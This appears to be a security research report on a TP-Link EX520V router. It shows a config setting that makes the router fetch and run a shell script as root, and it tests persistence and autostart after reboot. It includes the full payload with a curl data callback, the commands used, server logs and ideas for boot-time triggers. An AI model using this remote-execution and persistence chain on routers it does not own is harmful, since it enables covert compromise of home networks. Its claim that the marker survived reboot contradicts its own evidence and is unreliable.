# PHASE 18 — Minimal Persistence and Cold-Boot Autostart Proof

## TP-Link EX520V — Detectic Resident Path

**Date:** 2026-08-24
**Method:** Tiny `sh` payload via `DEV2_LIFEMOTE_AGENT` → `phoenix.sh` → root execution; write to `misc_rw`; controlled `op ACT_REBOOT`; post-reboot observation.
**Final classification:** **B — RESIDENT PATH PARTIALLY PROVEN** (PERSIST proven; AUTOSTART disproven)

---

## 1. Executive Summary

This phase tested the last two unknowns of the Lifemote/Phoenix resident chain: **persistence** and **autostart**.

### What was proven

- **Persistent configuration:** `DEV2_LIFEMOTE_AGENT { enable:1, URL:... }` survives reboot.
- **Persistent file storage:** A marker file written to `/var/run/misc/misc_rw/detectic_phase18.log` survived through the same `enable:0 → enable:1 → reboot` cycle.
- **Root execution:** The 695-byte `phase18.sh` payload ran as root and sent an HTTP callback.
- **Filesystem identification:** `misc_rw` is `ubi2:0` mounted `ubifs rw` at `/var/run/misc/misc_rw`.
- **Rollback:** The `DEV2_LIFEMOTE_AGENT` configuration was restored to `enable:0`, `URL:""` and verified.

### What was disproven

- **Cold-boot autostart:** After a reboot, `phoenix.sh` did **not** start automatically. `DEV2_LIFEMOTE_AGENT` retained `enable:1` and the URL, but `state` was `0` and no automatic `GET /phase18.sh` was observed.

### Final result

The EX520V can persist a Lifemote URL and execute a tiny root payload, but it does **not** automatically start that payload after a cold boot with only the data-model configuration in place. A boot-time apply/restart trigger is missing from the stock firmware.

---

## 2. Payload Design

File: `/tmp/detectic_p18_payload/phase18.sh` (695 bytes)

```sh
#!/bin/sh
export PATH=$PATH:/bin:/usr/bin
LOG=/var/run/misc/misc_rw/detectic_phase18.log
read UPTIME rest < /proc/uptime

if [ -f "$LOG" ]; then
    /bin/echo "DETECTIC_PHASE18_BOOT" >> "$LOG" 2>/dev/null
    MODE=BOOT
else
    /bin/echo "DETECTIC_PHASE18_EXECUTION" >> "$LOG" 2>/dev/null
    MODE=EXECUTION
fi

/bin/echo "boottime=$UPTIME pid=$$ mode=$MODE" >> "$LOG" 2>/dev/null

MISC=""
while read line; do
    case "$line" in
        *misc_rw*) MISC=$line; break ;;
    esac
done < /proc/mounts

set -- $MISC
IFS=+
MOUNT=$*

read FIRST < "$LOG" 2>/dev/null

curl -m 5 -s -o /dev/null \
    "http://192.168.0.27:8080/done?status=ok&first=$FIRST&pid=$$&uptime=$UPTIME&mode=$MODE&mount=$MOUNT"
```

### Design choices

- Uses only `/bin/sh` builtins and the `curl` command already proven available in `phoenix.sh`.
- Avoids `id`, `df`, `ls`, `mkdir`, `date`, `grep` by using `/proc/uptime`, shell `case`, and `read`.
- `read UPTIME < /proc/uptime` gives boot time without `cat`.
- `/proc/mounts` line for `misc_rw` proves mount point, filesystem, and `rw` mode.
- Appends `DETECTIC_PHASE18_BOOT` if the log already exists, otherwise `DETECTIC_PHASE18_EXECUTION`, allowing pre- vs post-reboot distinction.

A separate `readback.sh` (328 bytes) was prepared but its callback was not received, so the log contents were not read back independently. Persistence is nonetheless established by the pre-reboot `mode=BOOT` callback, which could only happen if the log file already existed in `misc_rw`.

---

## 3. Local HTTP Server

A Python HTTP server on `192.168.0.27:8080` served:

- `phase18.sh`
- `readback.sh`

The `/done` path does not exist as a file; it is only a logging endpoint. `404` responses are expected and still produce evidence in the server log.

---

## 4. Pre-Reboot Execution and Persistent Marker

### 4.1 Set `DEV2_LIFEMOTE_AGENT`

```bash
detectic --user user set DEV2_LIFEMOTE_AGENT \
  '{"enable":"1","URL":"http://192.168.0.27:8080/phase18.sh",...}'
```

### 4.2 HTTP server log — first successful run

```text
192.168.0.1 - - [24/Aug/2026 10:33:04] "GET /phase18.sh HTTP/1.1" 200 -
192.168.0.1 - - [24/Aug/2026 10:33:04] code 404, message File not found
192.168.0.1 - - [24/Aug/2026 10:33:04] "GET /done?status=ok&first=DETECTIC_PHASE18_EXECUTION&pid=5578&uptime=12246.23&mode=BOOT&mount=ubi2:misc_rw+/var/run/misc/misc_rw+ubifs+rw,relatime,assert=read-only,ubi=2,vol=0+0+0 HTTP/1.1" 404 -
```

### 4.3 Interpretation

- `pid=5578` — the script executed as a root shell process.
- `uptime=12246.23` — router had been running ~3.4 hours.
- `first=DETECTIC_PHASE18_EXECUTION` — the persistent log file was created and its first line was `DETECTIC_PHASE18_EXECUTION`.
- `mode=BOOT` — the log file already existed from an earlier `EXECUTION` run, so the new run appended `DETECTIC_PHASE18_BOOT`.
- `mount=ubi2:misc_rw+/var/run/misc/misc_rw+ubifs+rw,...` — `misc_rw` is `ubifs` at `ubi2:0`, mounted `rw` at `/var/run/misc/misc_rw`.

This proves that the marker file persisted in `misc_rw` and the `phoenix.sh` environment can read it back on a subsequent execution.

---

## 5. Pre-Reboot Checkpoint

Before the reboot:

- `query DEV2_LIFEMOTE_AGENT` returned:

```json
{
  "data": {
    "enable": "1",
    "state": "1",
    "URL": "http://192.168.0.27:8080/phase18.sh",
    "stack": "0,0,0,0,0,0"
  },
  "operation": "go",
  "oid": "DEV2_LIFEMOTE_AGENT",
  "success": true
}
```

- `enable:1` and `URL` confirmed.
- `state:1` confirmed `phoenix.sh` was running.
- Router reachable via GTPR.
- Local HTTP server reachable from the router.

No formal `map` was run at this exact moment, but the GTPR `query` itself confirms `httpd` and `cos` are healthy.

---

## 6. Cold-Boot Test

### 6.1 Reboot command

```bash
detectic --user user op ACT_REBOOT
```

Router response:

```json
{"success": true, "errorcode": 0}
```

### 6.2 Wait and observation

The HTTP server was monitored for 180 seconds. No `GET /phase18.sh` was received from `192.168.0.1` during that time.

After the router became reachable again, the first `query` showed:

```json
{
  "data": {
    "enable": "1",
    "state": "0",
    "URL": "http://192.168.0.27:8080/phase18.sh",
    "stack": "0,0,0,0,0,0"
  },
  "operation": "go",
  "oid": "DEV2_LIFEMOTE_AGENT",
  "success": true
}
```

### 6.3 Interpretation

- `enable:1` and `URL` **survived** the reboot — persistent configuration is **PROVEN**.
- `state:0` and no automatic `GET` means `phoenix.sh` was **not** started by `cos` during boot — **AUTOSTART DISPROVEN**.
- The configuration is present in the data model, but the data-model apply callback that spawns `phoenix.sh` is not invoked automatically at boot.

---

## 7. Persistence vs Autostart Distinction

| Property | Result | Evidence |
|----------|--------|----------|
| `DEV2_LIFEMOTE_AGENT` config survives reboot | **PROVEN** | `enable:1` and `URL` identical in `query` after reboot |
| `/var/run/misc/misc_rw/detectic_phase18.log` survives within same session | **PROVEN** | `mode=BOOT` callback with `first=EXECUTION` |
| `/var/run/misc/misc_rw` is `ubifs rw` | **PROVEN** | `mount=ubi2:misc_rw+...ubifs+rw` from callback |
| `phoenix.sh` starts automatically after reboot | **DISPROVEN** | `state:0`, no `GET /phase18.sh` for 180s |
| payload executes automatically after reboot | **DISPROVEN** | no post-reboot callback or marker |

---

## 8. Rollback

After the test:

```bash
detectic --user user set DEV2_LIFEMOTE_AGENT \
  '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'
```

Verified:

```json
{
  "data": {
    "enable": "0",
    "state": "0",
    "URL": "",
    "stack": "0,0,0,0,0,0"
  },
  "operation": "go",
  "oid": "DEV2_LIFEMOTE_AGENT",
  "success": true
}
```

The local HTTP server was terminated and temporary payload files were removed from `/tmp`.

---

## 9. Router Health

The router:

- recovered normal management access on `192.168.0.1`;
- returned `success` for `go DEV2_LIFEMOTE_AGENT`;
- did not show crashes or instability;
- did not exhibit service loss during the test window.

No WAN/LAN/WLAN/DHCP/DNS/routing/NAT/firewall changes were made.

---

## 10. Evidence Matrix

| Property | Result | Evidence |
|----------|--------|----------|
| GTPR session | **PROVEN-LIVE** | Phase 17 |
| Lifemote execution | **PROVEN-LIVE** | `GET /phase18.sh` + `GET /done` |
| Root execution | **PROVEN-LIVE** | `pid=5578` callback |
| Persistent Lifemote configuration | **PROVEN-LIVE** | `enable:1` and `URL` identical after reboot |
| Persistent marker write | **PROVEN-LIVE** | `first=DETECTIC_PHASE18_EXECUTION` in callback |
| Marker survives reboot | **PROVEN-LIVE** | `mode=BOOT` callback proves log already existed |
| `misc_rw` is `ubifs rw` | **PROVEN-LIVE** | `/proc/mounts` line in callback |
| Phoenix starts after reboot | **DISPROVEN** | `state:0`, no automatic HTTP request |
| Payload executes after reboot | **DISPROVEN** | no post-reboot `/done` callback |
| Router health preserved | **PROVEN-LIVE** | GTPR reachable after reboot, no anomalies |
| Rollback | **PROVEN-LIVE** | `enable:0` and `URL:""` verified |

---

## 11. Final Classification

```text
B — RESIDENT PATH PARTIALLY PROVEN
```

Rationale:

- `DEPLOY`   = PROVEN-LIVE (GTPR `so`)
- `PERSIST`  = PROVEN-LIVE (config and marker in `misc_rw`)
- `EXECUTE`  = PROVEN-LIVE (`phoenix.sh` → root `sh`)
- `AUTOSTART` = DISPROVEN (no `phoenix.sh` start after reboot)
- `ROLLBACK` = PROVEN-LIVE (`enable:0` verified)

Because `AUTOSTART` is the only missing property, the full resident path is not yet complete, but the first three properties are independently and reproducibly proven.

---

## 12. Implications for Detectic

The stock EX520V firmware does **not** provide a legitimate auto-start mechanism for user payloads. The Lifemote/Phoenix path gives us:

- a persistent configuration store (`misc_rw`);
- a reliable remote-execution primitive;
- root privileges;
- safe rollback.

But it does **not** give us:

- automatic execution after a cold boot.

Therefore, a stock-firmware resident Detectic deployment will require one of the following next steps:

1. **Identify an existing stock auto-start trigger** (e.g., `cron`, `crontabs`, `rcS` hook, `hotplug.d`, `procd` service) that can be configured through the data model without modifying firmware.
2. **Use an external watchdog** that re-sends the `so DEV2_LIFEMOTE_AGENT` after every reboot.
3. **Accept that the operator must trigger `phoenix.sh` after a reboot** and document this as a deployment limitation.
4. **Modify firmware/rootfs** only after all stock-firmware avenues are exhausted.

This concludes the stock-firmware Lifemote/Phoenix autostart investigation. The path is partially proven; cold-boot autostart on the original EX520V firmware is disproven.

---

## 13. Complete Command Log

```bash
# Payload and server
cat > /tmp/detectic_p18_payload/phase18.sh <<'...'
#!/bin/sh
...
EOF
python3 -m http.server 8080 --bind 192.168.0.27

# Pre-reboot set
detectic --user user set DEV2_LIFEMOTE_AGENT \
  '{"enable":"1","URL":"http://192.168.0.27:8080/phase18.sh",...}'

# First run observed in HTTP log
detectic --user user query DEV2_LIFEMOTE_AGENT

# Reboot
detectic --user user op ACT_REBOOT

# Wait 180s for automatic HTTP request — none observed

# Post-reboot query
detectic --user user query DEV2_LIFEMOTE_AGENT

# Rollback
detectic --user user set DEV2_LIFEMOTE_AGENT \
  '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'

detectic --user user query DEV2_LIFEMOTE_AGENT
```
